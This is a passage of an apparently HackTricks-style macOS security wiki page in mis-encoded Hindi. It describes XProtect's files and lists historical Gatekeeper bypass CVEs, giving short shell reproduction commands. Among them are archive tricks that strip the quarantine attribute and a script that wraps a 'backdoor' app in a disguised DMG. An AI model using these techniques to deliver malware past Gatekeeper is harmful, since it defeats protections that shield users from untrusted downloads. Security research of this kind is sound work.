XProtect рд╕реНрдерд┐рдд рд╣реИред SIP рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдкрд░ **/Library/Apple/System/Library/CoreServices/XProtect.bundle** рдФрд░ рдмрдВрдбрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА рдЬрд┐рд╕рдХрд╛ XProtect рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: рдЙрди cdhashes рдХреЗ рд╕рд╛рде рдХреЛрдб рдХреЛ рдкреБрд░рд╛рдиреА рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рджреЗрддрд╛ рд╣реИред
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID рдФрд░ TeamID рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд▓рдЧрдЗрди рдФрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рд╕реВрдЪреА рдпрд╛ рдиреНрдпреВрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓реА рд╕реВрдЪреАред
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: рдореИрд▓рд╡реЗрдпрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛рд░рд╛ рдирд┐рдпрдоред
* **`XProtect.bundle/Contents/Resources/gk.db`**: рдмреНрд▓реЙрдХ рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ TeamIDs рдХреЗ рд╣реИрд╢ рдХреЗ рд╕рд╛рде SQLite3 рдбреЗрдЯрд╛рдмреЗрд╕ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`/Library/Apple/System/Library/CoreServices/XProtect.app`** рдореЗрдВ рдПрдХ рдФрд░ рдРрдк рд╣реИ рдЬреЛ XProtect рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдЬреЛ Gatekeeper рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рд╕рдВрд▓рдЧреНрди рдирд╣реАрдВ рд╣реИред

### рдЧреЗрдЯрдХреАрдкрд░ рдирд╣реАрдВ

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЧреЗрдЯрдХреАрдкрд░ **рд╣рд░ рдмрд╛рд░ рдирд╣реАрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛** рд╣реИ рдЬрдм рдЖрдк рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓рд╛рддреЗ рд╣реИрдВ, рдмрд╕ _**AppleMobileFileIntegrity**_ (AMFI) рдХреЗрд╡рд▓ рддрдм **рдирд┐рд░реНрд╡рд╛рдЪрдиреАрдп рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐** рдХрд░реЗрдЧрд╛ рдЬрдм рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓рд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЧреЗрдЯрдХреАрдкрд░ рджреНрд╡рд╛рд░рд╛ рдкреБрд╖реНрдЯрд┐ рдХреА рдЧрдИ рд╣реИред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдкрд╣рд▓реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЧреЗрдЯрдХреАрдкрд░ рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рдерд╛, рдлрд┐рд░ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрднрд┐рдХреНрд░рд┐рдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛** (рдЬреИрд╕реЗ Electron asar рдпрд╛ NIB рдлрд╝рд╛рдЗрд▓реЗрдВ) рдФрд░ рдЕрдЧрд░ рдХреЛрдИ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдирд╣реАрдВ рдереЗ, рддреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдХреЛ** **рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг** **рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред**

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдм рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ macOS **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдВрдбрд▓ рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред** рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк [рдбрд░реНрдЯреА NIB](../macos-proces-abuse/macos-dirty-nib.md) рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдкрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдЗрд╕реЗ рдЙрд╕реЗ рджреБрд░реБрд╕реНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЧреЗрдЯрдХреАрдкрд░ рджреНрд╡рд╛рд░рд╛ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рдмрдВрдбрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗред рдФрд░ рдпрджрд┐ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Contents рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдирд╛рдо NotCon рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ (рдЬреИрд╕рд╛ рдХрд┐ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ), рдФрд░ рдлрд┐рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдореБрдЦреНрдп BINARY рдХреЛ рдЧреЗрдЯрдХреАрдкрд░ рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд▓рд╛рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ рдФрд░ рдирд╣реАрдВ рдЪрд▓рд╛рдПрдЧрд╛ред

## рдЧреЗрдЯрдХреАрдкрд░ рдмрд╛рдпрдкрд╛рд╕

рдЧреЗрдЯрдХреАрдкрд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рднреА рддрд░реАрдХрд╛ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдЫ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдЧреЗрдЯрдХреАрдкрд░ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдиреЗ рдкрд░ рднреА рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрдирд╛) macOS рдореЗрдВ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдХреБрдЫ CVEs рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд┐рдирд╕реЗ рдкрд┐рдЫрд▓реЗ рдореЗрдВ рдЧреЗрдЯрдХреАрдкрд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдереА:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рдХрд┐ рдпрджрд┐ **рдЖрд░реНрдХрд╛рдЗрд╡ рдпреВрдЯрд┐рд▓рд┐рдЯреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **886 рд╡рд░реНрдгреЛрдВ рд╕реЗ рдЕрдзрд┐рдХ рдкрде рд╡рд╛рд▓реА** рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ com.apple.quarantine рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддреАред рдпрд╣ рд╕реНрдерд┐рддрд┐ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **рдЧреЗрдЯрдХреАрдкрд░ рдХреА** рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рд╕реЗ **рдЫрд▓рдиреЗ** рджреЗрддреА рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) рджреЗрдЦреЗрдВред

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

рдЬрдм рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **Automator** рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдХрд┐ рд╡рд╣ рдХреНрдпрд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд╡рд╣ `application.app/Contents/document.wflow` рдореЗрдВ рд╣реЛрддреА рд╣реИ рди рдХрд┐ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдореЗрдВред рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕рд┐рд░реНрдл рдПрдХ рд╕рд╛рдорд╛рдиреНрдп Automator рдмрд╛рдЗрдирд░реА рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **Automator Application Stub** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдЖрдк `application.app/Contents/MacOS/Automator\ Application\ Stub` рдХреЛ **рдПрдХ рд╕рд┐рдореНрдмреЙрд▓рд┐рдХ рд▓рд┐рдВрдХ рдХреЗ рд╕рд╛рде рдЕрдиреНрдп Automator Application Stub рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпрд╣ `document.wflow` (рдЖрдкрдХрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ) рдХреЛ **рдЧреЗрдЯрдХреАрдкрд░ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдмрд┐рдирд╛** рдЪрд▓рд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рдкрд╛рд╕ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди xattr рдирд╣реАрдВ рд╣реИред

рдЙрдореНрдореАрдж рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реНрдерд╛рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://ronmasas.com/posts/bypass-macos-gatekeeper) рджреЗрдЦреЗрдВред

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдореЗрдВ рдПрдХ zip рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЧрдИ рдереА рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ `application.app/Contents` рд╕реЗ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рд╢реБрд░реБрдЖрдд рдХреА рдЧрдИ рдереА рдмрдЬрд╛рдп `application.app` рд╕реЗред рдЗрд╕рд▓рд┐рдП, **рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ** рд╕рднреА **рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛ рдЧрдпрд╛ рдерд╛ `application.app/Contents`** рд▓реЗрдХрд┐рди **`application.app` рдкрд░ рдирд╣реАрдВ**, рдЬрд┐рд╕реЗ рдЧреЗрдЯрдХреАрдкрд░ рдЬрд╛рдВрдЪ рдереА, рдЗрд╕рд▓рд┐рдП рдЧреЗрдЯрдХреАрдкрд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм `application.app` рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕рдореЗрдВ **рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рдерд╛ред**
```bash
zip -r test.app/Contents test.zip
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) рджреЗрдЦреЗрдВред

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдШрдЯрдХ рднрд┐рдиреНрди рд╣реИрдВ, рдЗрд╕ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо **`application.app/Contents`** рд╕реЗ рдПрдХ Apple Archive рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреЗ рддрд╛рдХрд┐ **`application.app` рдХреЛ рдЬрдм **Archive Utility** рджреНрд╡рд╛рд░рд╛ рдЕрдирдЖрд░реНрдХрд┐рд╡ рдХрд┐рдпрд╛ рдЬрд╛рдП, рддреЛ рд╡рд╣ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рди рдорд┐рд▓реЗред
```bash
aa archive -d test.app/Contents -o test.app.aar
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореМрд▓рд┐рдХ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдЧреБрдг рд▓рд┐рдЦрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **AppleDouble** рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЙрд╕рдХреЗ ACEs рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред

[**рд╕реНрд░реЛрдд рдХреЛрдб**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ ACL рдкрд╛рда рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ **`com.apple.acl.text`** рдирд╛рдордХ xattr рдХреЗ рдЕрдВрджрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ ACL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдиреЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ zip рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **AppleDouble** рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде рд╕рдВрдХреБрдЪрд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ ACL рд╣реИ рдЬреЛ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ... рддреЛ quarantine xattr рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реБрдЖ рдерд╛:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ AppleArchives рдХреЗ рд╕рд╛рде рднреА рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ **Google Chrome рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рдерд╛** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ macOS рдЖрдВрддрд░рд┐рдХ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдгред

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ `._` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдпрд╣ рдорджрдж рдХрд░рддрд╛ рд╣реИ **macOS рдорд╢реАрдиреЛрдВ рдХреЗ рдмреАрдЪ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдХреЙрдкреА рдХрд░рдиреЗ рдореЗрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ AppleDouble рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдпрд╣ рдиреЛрдЯрд┐рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐ `._` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЛ **quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рдирд╣реАрдВ рджреА рдЧрдИ рдереА**ред
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЬрд┐рд╕рдореЗрдВ quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ, рдпрд╣ **Gatekeeper рдХреЛ рдЫрд▓рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред** рдпрд╣ рдЯреНрд░рд┐рдХ рдереА **рдПрдХ DMG рдлрд╝рд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдирд╛** рдЬрд┐рд╕рдХрд╛ рдирд╛рдордХрд░рдг AppleDouble рдирд╛рдо рдкрд░рдВрдкрд░рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░реЗрдВ (рдЗрд╕реЗ `._` рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ) рдФрд░ рдЗрд╕ quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рдмрд┐рдирд╛ **рдЫрд┐рдкреА рд╣реБрдИ** рдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рджреГрд╢реНрдпрдорд╛рди рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВред\
рдЬрдм **dmg рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд╕реЗ **Gatekeeper рдХреЛ рдЫрд▓рд╛рдирд╛** рд╣реЛрдЧрд╛ред
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### рдЬрд╛рдВрдЪ рд░реЛрдХреЗрдВ xattr

рдПрдХ ".app" рдмрдВрдбрд▓ рдореЗрдВ рдЕрдЧрд░ quarantine xattr рдирд╣реАрдВ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЬрдм рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ **Gatekeeper рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
